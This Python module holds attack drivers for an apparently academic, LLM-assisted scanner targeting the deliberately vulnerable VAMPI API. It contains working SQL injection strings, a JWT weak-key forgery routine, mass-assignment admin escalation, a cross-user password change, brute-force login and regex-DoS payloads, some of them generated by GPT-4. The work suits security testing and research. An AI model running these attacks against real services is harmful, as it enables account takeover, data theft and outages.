"""
Modular attack drivers — one per confirmed VAMPI / OWASP API Top 10 instance.

Each driver runs a real multi-step flow against the target, asks the LLM (GPT-4)
to generate the concrete payloads where useful, and returns a Candidate carrying
the evidence + a success oracle. scan.py then runs the LLM Result Analyser over
each Candidate to produce the final, false-positive-reduced verdict.

Drivers are deterministic in structure (so the flow reliably executes) but use
GenAI for payload synthesis and verdict — the hybrid design from Chapter 3.
"""
from __future__ import annotations
import datetime
import uuid
from dataclasses import dataclass, field
from typing import Callable

import jwt as pyjwt

from .llm import LLM
from .target import Target, Exchange


@dataclass
class Candidate:
    gid: str                      # ground-truth id, e.g. VAMPI-01
    name: str
    owasp: str
    endpoint: str                 # ground-truth (templated) endpoint, for scoring
    attack_description: str
    success_oracle: str
    exchanges: list[Exchange] = field(default_factory=list)
    heuristic_vulnerable: bool = False

    def evidence(self) -> str:
        return "\n".join(e.as_text() for e in self.exchanges)


def _uniq(prefix: str) -> str:
    return f"{prefix}_{uuid.uuid4().hex[:8]}"


# --- VAMPI-01 SQL Injection -------------------------------------------------
def sqli_user_lookup(t: Target, llm: LLM, ctx: str) -> Candidate:
    ep = "/users/v1/{username}"
    c = Candidate("VAMPI-01", "SQL Injection on user lookup",
                  "API8:2023 Security Misconfiguration", ep,
                  "Inject SQL into the {username} path segment of GET /users/v1/{username}.",
                  "An injection payload returns HTTP 200 with user data, whereas a random "
                  "non-existent username returns 404 — proving the query is string-built.")
    ghost = _uniq("nouser")
    _, b = t.request("GET", "/users/v1/" + t.enc(ghost)); c.exchanges.append(b)
    gen = llm.generate_payloads(c.owasp, ep,
                                "Generate SQL injection strings to place in the {username} "
                                "path segment to bypass the WHERE clause and return a row.",
                                ctx, {"injections": ["string"]})
    injections = gen.get("injections") or ["' OR '1'='1", "' OR 1=1-- -", "x' OR 'a'='a"]
    for inj in injections[:5]:
        r, ex = t.request("GET", "/users/v1/" + t.enc(inj)); c.exchanges.append(ex)
        if r.status_code == 200 and ('"username"' in r.text or "username" in r.text):
            c.heuristic_vulnerable = True
            break
    return c


# --- VAMPI-02 BOLA ----------------------------------------------------------
def bola_book_secret(t: Target, llm: LLM, ctx: str) -> Candidate:
    ep = "/books/v1/{book}"
    c = Candidate("VAMPI-02", "Broken Object Level Authorization on book secret",
                  "API1:2023 Broken Object Level Authorization", ep,
                  "Register a fresh attacker, then request another user's book by title.",
                  "Attacker (who owns no books) receives HTTP 200 with another user's "
                  "secret and an 'owner' different from the attacker.")
    au, ap = _uniq("bola"), "Passw0rd!"
    c.exchanges.append(t.register(au, ap, au + "@t.com"))
    token, lex = t.login(au, ap); c.exchanges.append(lex)
    r, lst = t.request("GET", "/books/v1"); c.exchanges.append(lst)
    titles = []
    try:
        for b in (r.json().get("Books") or []):
            title = b.get("book_title") if isinstance(b, dict) else None
            if title:
                titles.append(title)
    except Exception:
        pass
    for title in titles[:3]:
        r, ex = t.request("GET", "/books/v1/" + t.enc(title), token=token); c.exchanges.append(ex)
        if r.status_code == 200 and "secret" in r.text and au not in r.text:
            c.heuristic_vulnerable = True
            break
    return c


# --- VAMPI-03 username/password enumeration --------------------------------
def auth_enumeration(t: Target, llm: LLM, ctx: str) -> Candidate:
    ep = "/users/v1/login"
    c = Candidate("VAMPI-03", "Broken Authentication - user/password enumeration",
                  "API2:2023 Broken Authentication", ep,
                  "Compare login error for an existing user (wrong password) vs a "
                  "non-existent user.",
                  "The two error messages differ, revealing whether the username exists.")
    _, e1 = t.login("name1", "definitely_wrong"); c.exchanges.append(e1)
    _, e2 = t.login(_uniq("ghost"), "definitely_wrong"); c.exchanges.append(e2)
    c.heuristic_vulnerable = (e1.response_excerpt != e2.response_excerpt)
    return c


# --- VAMPI-04 weak/static JWT key -> forgery -------------------------------
def weak_jwt_forgery(t: Target, llm: LLM, ctx: str) -> Candidate:
    ep = "/me"
    c = Candidate("VAMPI-04", "Broken Authentication - weak JWT signing key",
                  "API2:2023 Broken Authentication", ep,
                  "Forge an HS256 JWT (sub=name1) signed with candidate weak keys and "
                  "call GET /me without logging in.",
                  "A forged token is accepted (HTTP 200, returns name1's profile), proving "
                  "the signing key is guessable.")
    gen = llm.generate_payloads(c.owasp, ep,
                                "List common weak/default HMAC secret keys a developer might "
                                "use to sign JWTs (e.g. 'secret','random'). Return candidates "
                                "to test for token forgery.",
                                ctx, {"keys": ["string"]})
    # Merge a built-in weak-key wordlist with the LLM's suggestions. The built-in
    # list goes FIRST so known weak keys are always tried before the cap (the LLM
    # output is nondeterministic and must not push a real key past the limit).
    common = ["secret", "random", "key", "changeme", "password", "jwt", "admin",
              "test", "123456", "secretkey", "default", "qwerty"]
    keys = list(dict.fromkeys(common + (gen.get("keys") or [])))
    now = datetime.datetime.utcnow()
    for k in keys[:30]:
        payload = {"sub": "name1", "iat": now, "exp": now + datetime.timedelta(hours=1)}
        try:
            tok = pyjwt.encode(payload, k, algorithm="HS256")
        except Exception:
            continue
        r, ex = t.request("GET", "/me", token=tok)
        ex.request_body = f"forged JWT signed with '{k}'"; c.exchanges.append(ex)
        if r.status_code == 200 and "name1" in r.text:
            c.heuristic_vulnerable = True
            break
    return c


# --- VAMPI-05 mass assignment ----------------------------------------------
def mass_assignment(t: Target, llm: LLM, ctx: str) -> Candidate:
    ep = "/users/v1/register"
    c = Candidate("VAMPI-05", "Mass Assignment - self-grant admin",
                  "API3:2023 Broken Object Property Level Authorization", ep,
                  "Register a user with an extra property to escalate to admin, then check "
                  "the resulting role via GET /me.",
                  "A self-registered user ends up with admin=true.")
    gen = llm.generate_payloads(c.owasp, ep,
                                "The user model has an 'admin' boolean. Identify the extra "
                                "JSON property/value to add to a registration body to gain "
                                "admin via mass assignment.",
                                ctx, {"extra_fields": {"admin": True}})
    extra = gen.get("extra_fields")
    if not isinstance(extra, dict) or not extra:
        extra = {"admin": True}
    u, p = _uniq("massadmin"), "Passw0rd!"
    c.exchanges.append(t.register(u, p, u + "@t.com", extra=extra))
    token, lex = t.login(u, p); c.exchanges.append(lex)
    r, ex = t.request("GET", "/me", token=token); c.exchanges.append(ex)
    try:
        c.heuristic_vulnerable = bool(r.json().get("data", {}).get("admin")) is True
    except Exception:
        c.heuristic_vulnerable = '"admin": true' in r.text.lower()
    return c


# --- VAMPI-06 excessive data exposure via debug ----------------------------
def debug_data_exposure(t: Target, llm: LLM, ctx: str) -> Candidate:
    ep = "/users/v1/_debug"
    c = Candidate("VAMPI-06", "Excessive Data Exposure via debug endpoint",
                  "API3:2023 Broken Object Property Level Authorization", ep,
                  "Request the undocumented GET /users/v1/_debug endpoint unauthenticated.",
                  "Response returns all users including plaintext 'password' fields.")
    r, ex = t.request("GET", "/users/v1/_debug"); c.exchanges.append(ex)
    c.heuristic_vulnerable = (r.status_code == 200 and "password" in r.text)
    return c


# --- VAMPI-07 BFLA: change another user's password -------------------------
def bfla_password_change(t: Target, llm: LLM, ctx: str) -> Candidate:
    ep = "/users/v1/{username}/password"
    c = Candidate("VAMPI-07", "Broken Function Level Authorization - change other user's password",
                  "API5:2023 Broken Function Level Authorization", ep,
                  "As a low-privilege attacker, PUT a new password to /users/v1/name2/password, "
                  "then log in as name2 with it.",
                  "Login as the victim (name2) succeeds with the attacker-set password.")
    au, ap = _uniq("pwatk"), "Passw0rd!"
    c.exchanges.append(t.register(au, ap, au + "@t.com"))
    token, lex = t.login(au, ap); c.exchanges.append(lex)
    newpw = _uniq("pwned")
    _, ex = t.request("PUT", "/users/v1/name2/password", token=token,
                      json_body={"password": newpw}); c.exchanges.append(ex)
    vtok, vex = t.login("name2", newpw); c.exchanges.append(vex)
    c.heuristic_vulnerable = vtok is not None
    return c


# --- VAMPI-08 ReDoS on email update ----------------------------------------
def redos_email(t: Target, llm: LLM, ctx: str) -> Candidate:
    ep = "/users/v1/{username}/email"
    c = Candidate("VAMPI-08", "Unrestricted Resource Consumption - Regex DoS",
                  "API4:2023 Unrestricted Resource Consumption", ep,
                  "Submit an email that triggers catastrophic regex backtracking to the "
                  "email-update endpoint and measure latency vs a normal email.",
                  "A crafted payload makes the request take dramatically longer (or time out) "
                  "than a normal email update, indicating Regex DoS.")
    au, ap = _uniq("redos"), "Passw0rd!"
    c.exchanges.append(t.register(au, ap, au + "@t.com"))
    token, lex = t.login(au, ap); c.exchanges.append(lex)
    _, base = t.request("PUT", f"/users/v1/{au}/email", token=token,
                        json_body={"email": "normal@mail.com"}); c.exchanges.append(base)
    base_ms = base.elapsed_ms
    gen = llm.generate_payloads(c.owasp, ep,
                                r"Generate email-field strings that cause catastrophic "
                                r"backtracking against this regex: "
                                r"^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@{1}([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$ "
                                r"The string should ultimately NOT match so the engine backtracks.",
                                ctx, {"redos_payloads": ["string"]})
    payloads = gen.get("redos_payloads") or ["a" * 40 + "@" + "a" * 30 + "!", "a" * 50 + "!"]
    worst = base_ms
    redos_timeout = 8                                  # cap: a >8s hang already proves ReDoS
    for pl in payloads[:2]:
        try:
            _, ex = t.request("PUT", f"/users/v1/{au}/email", token=token,
                              json_body={"email": pl}, timeout=redos_timeout); c.exchanges.append(ex)
            worst = max(worst, ex.elapsed_ms)
        except Exception as exc:                       # timeout = extreme latency = strong signal
            c.exchanges.append(Exchange("PUT", f"{t.base_url}/users/v1/{au}/email", 0,
                                        redos_timeout * 1000, json_str(pl), f"request error/timeout: {exc}"))
            worst = redos_timeout * 1000
            break
    c.heuristic_vulnerable = worst > max(1000.0, base_ms * 15)
    return c


# --- VAMPI-09 no rate limiting on login ------------------------------------
def no_rate_limiting(t: Target, llm: LLM, ctx: str) -> Candidate:
    ep = "/users/v1/login"
    c = Candidate("VAMPI-09", "Unrestricted Resource Consumption - no rate limiting",
                  "API4:2023 Unrestricted Resource Consumption", ep,
                  "Send 20 rapid failed login attempts for the same account.",
                  "All attempts are processed with no 429/Retry-After and no lockout, "
                  "showing brute-force is unthrottled.")
    statuses = []
    for i in range(20):
        _, ex = t.login("name1", f"wrong_{i}")   # login() returns (token, Exchange)
        statuses.append(ex.status)
    # keep first+last exchanges as evidence to stay concise
    c.exchanges.append(t.exchanges[-20])
    c.exchanges.append(t.exchanges[-1])
    c.heuristic_vulnerable = (429 not in statuses and all(s and s < 500 for s in statuses))
    return c


def json_str(x) -> str:
    import json
    try:
        return json.dumps(x)[:120]
    except Exception:
        return str(x)[:120]


# ReDoS is intentionally LAST: it can exhaust VAMPI's single-threaded dev server,
# which would otherwise starve any driver that runs after it.
ALL_DRIVERS: list[Callable[[Target, LLM, str], Candidate]] = [
    sqli_user_lookup,
    bola_book_secret,
    auth_enumeration,
    weak_jwt_forgery,
    mass_assignment,
    debug_data_exposure,
    bfla_password_change,
    no_rate_limiting,
    redos_email,
]
